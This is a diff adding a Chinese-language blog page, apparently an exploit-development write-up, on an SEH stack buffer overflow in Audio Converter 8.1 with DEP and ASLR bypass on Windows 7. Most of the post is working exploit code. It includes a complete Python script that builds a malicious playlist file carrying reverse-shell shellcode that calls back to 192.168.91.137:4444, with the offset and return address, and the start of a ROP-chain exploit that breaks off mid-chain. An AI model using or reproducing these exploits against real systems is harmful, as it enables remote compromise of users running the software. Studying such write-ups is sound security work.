@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"n0maj1o24.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本次讨论的Audio Converter 8.1在Win7  SP1 6.1.7601和Win10  10.0.19044两者之间有一些不同，在Win7下漏洞能够利用成功，在Win10下会出现SEH Handler无法捕捉到异常，导致漏洞执行失败。 先来看Win7下的漏洞利用：之前遇到的SEH栈溢出漏洞，覆盖的都是SEH链的第一个NSEH和SEH Handler，而这里覆盖的是第二个NSEH和SE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Audio Converter 8.1 - SEH Stack Buffer Overflow:DEP and ASLR bypass">
+<meta property="og:url" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/index.html">
+<meta property="og:site_name" content="Technical Memorandum">
+<meta property="og:description" content="本次讨论的Audio Converter 8.1在Win7  SP1 6.1.7601和Win10  10.0.19044两者之间有一些不同，在Win7下漏洞能够利用成功，在Win10下会出现SEH Handler无法捕捉到异常，导致漏洞执行失败。 先来看Win7下的漏洞利用：之前遇到的SEH栈溢出漏洞，覆盖的都是SEH链的第一个NSEH和SEH Handler，而这里覆盖的是第二个NSEH和SE">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/01.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/02.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/03.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/04.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/05.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/06.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/07.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/08.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/03.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/09.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/10.png">
+<meta property="article:published_time" content="2022-05-11T23:06:13.000Z">
+<meta property="article:modified_time" content="2022-05-11T15:12:35.535Z">
+<meta property="article:author" content="n0maj1o24">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Stack Based Overflows">
+<meta property="article:tag" content="DEP">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="ASLR">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/01.png">
+
+<link rel="canonical" href="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Audio Converter 8.1 - SEH Stack Buffer Overflow:DEP and ASLR bypass | Technical Memorandum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Technical Memorandum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Audio Converter 8.1 - SEH Stack Buffer Overflow:DEP and ASLR bypass
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-11 23:06:13 / 修改时间：15:12:35" itemprop="dateCreated datePublished" datetime="2022-05-11T23:06:13Z">2022-05-11</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本次讨论的<code>Audio Converter 8.1</code>在<code>Win7  SP1 6.1.7601</code>和<code>Win10  10.0.19044</code>两者之间有一些不同，在<code>Win7</code>下漏洞能够利用成功，在<code>Win10</code>下会出现<code>SEH Handler</code>无法捕捉到异常，导致漏洞执行失败。</p>
+<p>先来看<code>Win7</code>下的漏洞利用：之前遇到的<code>SEH</code>栈溢出漏洞，覆盖的都是<code>SEH</code>链的第一个<code>NSEH</code>和<code>SEH Handler</code>，而这里覆盖的是第二个<code>NSEH</code>和<code>SEH Handler</code>。简单的部分就不说了,<code>Win7</code>下<code>Offset</code>为<code>4432</code>(覆盖<code>NSEH</code>的值)，坏字符为<code>\x00\x0a</code>。</p>
+<p>看一下溢出的时候，其实是<code>SEH</code>链第二个节点被覆盖：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/01.png" alt="BOF"></p>
+<p>但是，这不影响漏洞利用的方式，还是<code>P\P\R</code>结合<code>JMP</code>，如果当前异常处理函数无法处理异常，则会转到下一个异常处理函数处理，所以覆盖的异常处理函数是可以得到执行的，进而执行写入的<code>shellcode</code>。考虑要<code>bypass ASLR</code>，所以需要找到未开启<code>ASLR</code>的<code>DLL</code>：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/02.png" alt="BOF"></p>
+<p><code>win7</code>下没有开启全局<code>DEP</code>时，就是简单的<code>SEH</code> 栈溢出，最终的利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"exploit.pls"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.91.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode -b '\x00\x3d' </span></span><br><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xdd\xc6\xd9\x74\x24\xf4\x58\x33\xc9\xbe\xab"</span></span><br><span class="line">shellcode += <span class="string">b"\x77\x29\x71\xb1\x52\x31\x70\x17\x03\x70\x17"</span></span><br><span class="line">shellcode += <span class="string">b"\x83\x43\x8b\xcb\x84\x6f\x9c\x8e\x67\x8f\x5d"</span></span><br><span class="line">shellcode += <span class="string">b"\xef\xee\x6a\x6c\x2f\x94\xff\xdf\x9f\xde\xad"</span></span><br><span class="line">shellcode += <span class="string">b"\xd3\x54\xb2\x45\x67\x18\x1b\x6a\xc0\x97\x7d"</span></span><br><span class="line">shellcode += <span class="string">b"\x45\xd1\x84\xbe\xc4\x51\xd7\x92\x26\x6b\x18"</span></span><br><span class="line">shellcode += <span class="string">b"\xe7\x27\xac\x45\x0a\x75\x65\x01\xb9\x69\x02"</span></span><br><span class="line">shellcode += <span class="string">b"\x5f\x02\x02\x58\x71\x02\xf7\x29\x70\x23\xa6"</span></span><br><span class="line">shellcode += <span class="string">b"\x22\x2b\xe3\x49\xe6\x47\xaa\x51\xeb\x62\x64"</span></span><br><span class="line">shellcode += <span class="string">b"\xea\xdf\x19\x77\x3a\x2e\xe1\xd4\x03\x9e\x10"</span></span><br><span class="line">shellcode += <span class="string">b"\x24\x44\x19\xcb\x53\xbc\x59\x76\x64\x7b\x23"</span></span><br><span class="line">shellcode += <span class="string">b"\xac\xe1\x9f\x83\x27\x51\x7b\x35\xeb\x04\x08"</span></span><br><span class="line">shellcode += <span class="string">b"\x39\x40\x42\x56\x5e\x57\x87\xed\x5a\xdc\x26"</span></span><br><span class="line">shellcode += <span class="string">b"\x21\xeb\xa6\x0c\xe5\xb7\x7d\x2c\xbc\x1d\xd3"</span></span><br><span class="line">shellcode += <span class="string">b"\x51\xde\xfd\x8c\xf7\x95\x10\xd8\x85\xf4\x7c"</span></span><br><span class="line">shellcode += <span class="string">b"\x2d\xa4\x06\x7d\x39\xbf\x75\x4f\xe6\x6b\x11"</span></span><br><span class="line">shellcode += <span class="string">b"\xe3\x6f\xb2\xe6\x04\x5a\x02\x78\xfb\x65\x73"</span></span><br><span class="line">shellcode += <span class="string">b"\x51\x38\x31\x23\xc9\xe9\x3a\xa8\x09\x15\xef"</span></span><br><span class="line">shellcode += <span class="string">b"\x7f\x59\xb9\x40\xc0\x09\x79\x31\xa8\x43\x76"</span></span><br><span class="line">shellcode += <span class="string">b"\x6e\xc8\x6c\x5c\x07\x63\x97\x37\xe8\xdc\xcc"</span></span><br><span class="line">shellcode += <span class="string">b"\x4e\x80\x1e\xf2\x41\x0d\x96\x14\x0b\xbd\xfe"</span></span><br><span class="line">shellcode += <span class="string">b"\x8f\xa4\x24\x5b\x5b\x54\xa8\x71\x26\x56\x22"</span></span><br><span class="line">shellcode += <span class="string">b"\x76\xd7\x19\xc3\xf3\xcb\xce\x23\x4e\xb1\x59"</span></span><br><span class="line">shellcode += <span class="string">b"\x3b\x64\xdd\x06\xae\xe3\x1d\x40\xd3\xbb\x4a"</span></span><br><span class="line">shellcode += <span class="string">b"\x05\x25\xb2\x1e\xbb\x1c\x6c\x3c\x46\xf8\x57"</span></span><br><span class="line">shellcode += <span class="string">b"\x84\x9d\x39\x59\x05\x53\x05\x7d\x15\xad\x86"</span></span><br><span class="line">shellcode += <span class="string">b"\x39\x41\x61\xd1\x97\x3f\xc7\x8b\x59\xe9\x91"</span></span><br><span class="line">shellcode += <span class="string">b"\x60\x30\x7d\x67\x4b\x83\xfb\x68\x86\x75\xe3"</span></span><br><span class="line">shellcode += <span class="string">b"\xd9\x7f\xc0\x1c\xd5\x17\xc4\x65\x0b\x88\x2b"</span></span><br><span class="line">shellcode += <span class="string">b"\xbc\x8f\xa8\xc9\x14\xfa\x40\x54\xfd\x47\x0d"</span></span><br><span class="line">shellcode += <span class="string">b"\x67\x28\x8b\x28\xe4\xd8\x74\xcf\xf4\xa9\x71"</span></span><br><span class="line">shellcode += <span class="string">b"\x8b\xb2\x42\x08\x84\x56\x64\xbf\xa5\x72"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># badchars: \x00\x3d</span></span><br><span class="line">payload=<span class="string">b"A"</span>*<span class="number">4432</span></span><br><span class="line">payload+=<span class="string">b"\xeb\x06\x90\x90"</span></span><br><span class="line">payload += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x1002b51c</span>)</span><br><span class="line">payload+=<span class="string">b"\x90"</span>*<span class="number">16</span></span><br><span class="line">payload+=shellcode</span><br><span class="line">payload+=<span class="string">b"C"</span>*(<span class="number">45544</span>-len(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"exploit.pls"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(payload)</span><br></pre></td></tr></table></figure>
+
+<p>成功反弹<code>shell</code>：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/03.png" alt="BOF"></p>
+<p>现在开启全局<code>DEP</code>，来看一下，基本的步骤就不说了，截图几张：</p>
+<p>利用<code>mona</code>，在每个<code>SEH Handler</code>下断点，这个方法还挺方便的：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/04.png" alt="BOF"></p>
+<p>查找<code>ROP Chain</code>在内存的位置：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/05.png" alt="BOF"></p>
+<p>执行到触发<code>SEH</code>之后，查看此刻<code>ESP</code>，得到<code>ROP Chain</code>与<code>ROP</code>之间的距离：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/06.png" alt="BOF"></p>
+<p>利用<code>mona</code>寻找跳转大于等于<code>2412</code>的<code>ROP Gadget</code>：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/07.png" alt="BOF"></p>
+<p>在生成的<code>stackpivot.txt</code>文件中挑选符合要求的<code>ROP Gadget</code>：</p>
+<p><img src="/2022/05/12/Audio-Converter-8-1-SEH-Stack-Buffer-Overflow-DEP-and-ASLR-bypass/08.png" alt="BOF"></p>
+<p>这里选择<code>0x100646bb</code>作为覆盖<code>seh</code>的地址。注意跳转了<code>3652</code>个字节，需要在<code>ROP Chain</code>前面填充一些<code>\x90</code>，不然会跳转到<code>ROP Chain</code>内部，导致无法执行。经过多次尝试，需要添加<code>1348</code>个<code>\x90</code>才能精确到达<code>ROP Chain</code>的最开始部分。</p>
+<p>最终的利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">total_size = <span class="number">200000</span></span><br><span class="line">filename=<span class="string">"exploit_seh.pls"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.91.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode -b '\x00\x3d' </span></span><br><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xdd\xc6\xd9\x74\x24\xf4\x58\x33\xc9\xbe\xab"</span></span><br><span class="line">shellcode += <span class="string">b"\x77\x29\x71\xb1\x52\x31\x70\x17\x03\x70\x17"</span></span><br><span class="line">shellcode += <span class="string">b"\x83\x43\x8b\xcb\x84\x6f\x9c\x8e\x67\x8f\x5d"</span></span><br><span class="line">shellcode += <span class="string">b"\xef\xee\x6a\x6c\x2f\x94\xff\xdf\x9f\xde\xad"</span></span><br><span class="line">shellcode += <span class="string">b"\xd3\x54\xb2\x45\x67\x18\x1b\x6a\xc0\x97\x7d"</span></span><br><span class="line">shellcode += <span class="string">b"\x45\xd1\x84\xbe\xc4\x51\xd7\x92\x26\x6b\x18"</span></span><br><span class="line">shellcode += <span class="string">b"\xe7\x27\xac\x45\x0a\x75\x65\x01\xb9\x69\x02"</span></span><br><span class="line">shellcode += <span class="string">b"\x5f\x02\x02\x58\x71\x02\xf7\x29\x70\x23\xa6"</span></span><br><span class="line">shellcode += <span class="string">b"\x22\x2b\xe3\x49\xe6\x47\xaa\x51\xeb\x62\x64"</span></span><br><span class="line">shellcode += <span class="string">b"\xea\xdf\x19\x77\x3a\x2e\xe1\xd4\x03\x9e\x10"</span></span><br><span class="line">shellcode += <span class="string">b"\x24\x44\x19\xcb\x53\xbc\x59\x76\x64\x7b\x23"</span></span><br><span class="line">shellcode += <span class="string">b"\xac\xe1\x9f\x83\x27\x51\x7b\x35\xeb\x04\x08"</span></span><br><span class="line">shellcode += <span class="string">b"\x39\x40\x42\x56\x5e\x57\x87\xed\x5a\xdc\x26"</span></span><br><span class="line">shellcode += <span class="string">b"\x21\xeb\xa6\x0c\xe5\xb7\x7d\x2c\xbc\x1d\xd3"</span></span><br><span class="line">shellcode += <span class="string">b"\x51\xde\xfd\x8c\xf7\x95\x10\xd8\x85\xf4\x7c"</span></span><br><span class="line">shellcode += <span class="string">b"\x2d\xa4\x06\x7d\x39\xbf\x75\x4f\xe6\x6b\x11"</span></span><br><span class="line">shellcode += <span class="string">b"\xe3\x6f\xb2\xe6\x04\x5a\x02\x78\xfb\x65\x73"</span></span><br><span class="line">shellcode += <span class="string">b"\x51\x38\x31\x23\xc9\xe9\x3a\xa8\x09\x15\xef"</span></span><br><span class="line">shellcode += <span class="string">b"\x7f\x59\xb9\x40\xc0\x09\x79\x31\xa8\x43\x76"</span></span><br><span class="line">shellcode += <span class="string">b"\x6e\xc8\x6c\x5c\x07\x63\x97\x37\xe8\xdc\xcc"</span></span><br><span class="line">shellcode += <span class="string">b"\x4e\x80\x1e\xf2\x41\x0d\x96\x14\x0b\xbd\xfe"</span></span><br><span class="line">shellcode += <span class="string">b"\x8f\xa4\x24\x5b\x5b\x54\xa8\x71\x26\x56\x22"</span></span><br><span class="line">shellcode += <span class="string">b"\x76\xd7\x19\xc3\xf3\xcb\xce\x23\x4e\xb1\x59"</span></span><br><span class="line">shellcode += <span class="string">b"\x3b\x64\xdd\x06\xae\xe3\x1d\x40\xd3\xbb\x4a"</span></span><br><span class="line">shellcode += <span class="string">b"\x05\x25\xb2\x1e\xbb\x1c\x6c\x3c\x46\xf8\x57"</span></span><br><span class="line">shellcode += <span class="string">b"\x84\x9d\x39\x59\x05\x53\x05\x7d\x15\xad\x86"</span></span><br><span class="line">shellcode += <span class="string">b"\x39\x41\x61\xd1\x97\x3f\xc7\x8b\x59\xe9\x91"</span></span><br><span class="line">shellcode += <span class="string">b"\x60\x30\x7d\x67\x4b\x83\xfb\x68\x86\x75\xe3"</span></span><br><span class="line">shellcode += <span class="string">b"\xd9\x7f\xc0\x1c\xd5\x17\xc4\x65\x0b\x88\x2b"</span></span><br><span class="line">shellcode += <span class="string">b"\xbc\x8f\xa8\xc9\x14\xfa\x40\x54\xfd\x47\x0d"</span></span><br><span class="line">shellcode += <span class="string">b"\x67\x28\x8b\x28\xe4\xd8\x74\xcf\xf4\xa9\x71"</span></span><br><span class="line">shellcode += <span class="string">b"\x8b\xb2\x42\x08\x84\x56\x64\xbf\xa5\x72"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_rop_chain</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">	rop_gadgets = [</span><br><span class="line">	  <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">	  <span class="number">0x10070b5f</span>,  <span class="comment"># POP EBP # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="number">0x10070b5f</span>,  <span class="comment"># skip 4 bytes [audconv.dll]</span></span><br><span class="line">	  <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">	  <span class="number">0x1006c128</span>,  <span class="comment"># POP EBX # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="number">0x00000001</span>,  <span class="comment"># 0x00000001-&gt; ebx</span></span><br><span class="line">	  <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">	  <span class="number">0x10082d43</span>,  <span class="comment"># POP EDX # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="number">0x00001000</span>,  <span class="comment"># 0x00001000-&gt; edx</span></span><br><span class="line">	  <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">	  <span class="number">0x10073e81</span>,  <span class="comment"># POP ECX # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="number">0x00000040</span>,  <span class="comment"># 0x00000040-&gt; ecx</span></span><br><span class="line">	  <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">	  <span class="number">0x100147d2</span>,  <span class="comment"># POP EDI # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="number">0x1003f2b9</span>,  <span class="comment"># RETN (ROP NOP) [audconv.dll]</span></span><br><span class="line">	  <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">	  <span class="number">0x10001a43</span>,  <span class="comment"># POP ESI # RETN [audconv.dll] </span></span><br><span class="line">	  <span class="number">0x1006685a</span>,  <span class="comment"># JMP [EAX] 